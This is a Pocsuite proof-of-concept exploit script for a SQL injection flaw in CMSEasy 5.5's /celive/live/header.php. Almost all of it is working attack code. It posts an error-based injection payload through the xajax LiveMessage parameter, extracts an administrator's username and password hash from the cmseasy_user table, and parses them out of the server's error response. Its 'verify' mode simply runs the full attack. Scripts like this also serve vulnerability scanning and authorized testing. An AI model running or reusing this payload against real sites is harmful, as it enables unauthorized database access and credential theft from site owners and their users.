#!/usr/bin/python
# -*- coding: utf-8 -*-


# If you have issues about development, please read:
# https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
# https://github.com/knownsec/Pocsuite/blob/master/docs/COPYING

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re


def send_command(url, cmd):
    try:
        httpreq = req.Session()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Content-Length': '255'}
        resp = httpreq.post(url, headers=headers, data='%s' % cmd)
    except:
        resp = None
    return resp


class TestPOC(POCBase):
    name = 'CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC'.decode('utf-8')
    vulID = '0'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['baozi']
    vulType = 'sql_inj'
    version = '1.0'  # default version: 1.0
    references = ['http://wooyun.org/bugs/wooyun-2010-070827']
    desc = '''CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'CMSEasy_cms'
    appVersion = '5.5'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        result = {}
        self.url = self.url + "/celive/live/header.php"
        post = "xajax=LiveMessage&xajaxargs[0][name]=1',(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(username,0x23,password) from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),'','','','1','127.0.0.1','2')#"
        resp = send_command(self.url, post)
        if resp and resp.text and resp.status_code == 200:
            info = re.findall(r'entry \'(.*?)\'', resp.text)
            if len(info) > 0:
                info1 = info[0].split('#', 1)
                result['Database'] = {}
                result['Database']['user'] = info1[0]
                result['Database']['password'] = info1[1]

        return self.parse_output(result)

    def _verify(self):
        '''verify mode'''
        return self._attack()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)